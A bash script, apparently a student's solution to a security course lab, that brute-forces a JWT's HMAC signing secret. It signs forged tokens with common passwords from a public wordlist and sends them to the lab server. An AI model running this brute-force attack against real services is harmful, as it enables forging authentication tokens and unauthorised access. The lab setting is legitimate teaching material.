#!/bin/bash
# q1
#curl "https://learn.operatoroverload.com/~jmadar/lab7/q1.sh" -H "Authorization: Bearer eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJzdWIiOiIxMjM0NTY3ODkwIiwibmFtZSI6IkpvaG4gRG9lIiwiaWF0IjoxNTE2MjM5MDIyfQ.GW5pCZoLDm4VXV9ccSWVYLjSpL9MMK7cpQI-AYcJ_dc"

# q2
HEADER='{"alg":"HS256","typ":"JWT"}'
PAYLOAD="{}"
B64_HEADER=$(echo -n "$HEADER" | base64 | tr '+' '-' | tr '/' '_' | tr -d '=')
B64_PAYLOAD=$(echo -n "$PAYLOAD" | base64 | tr '+' '-' | tr '/' '_' | tr -d '=')

PASSWORDS=$(curl -s https://raw.githubusercontent.com/danielmiessler/SecLists/master/Passwords/Common-Credentials/10k-most-common.txt | head -n 150)

for PASS in $PASSWORDS
do
  SIGNATURE=$(echo -n "${B64_HEADER}.${B64_PAYLOAD}" | openssl dgst -sha256 -hmac "$PASS" -binary | base64 | tr '+' '-' | tr '/' '_' | tr -d '=')
  JWT="${B64_HEADER}.${B64_PAYLOAD}.${SIGNATURE}"

  RESPONSE=$(curl -H "Authorization: Bearer $JWT" "https://learn.operatoroverload.com/~jmadar/lab7/q2.sh")
  if [[ $RESPONSE == *"Token has been tempered!"* ]]; then
    echo "Incorrect secret: $PASS"
  else
    echo "Correct secret found: $PASS"
    exit 0
  fi
done
exit 1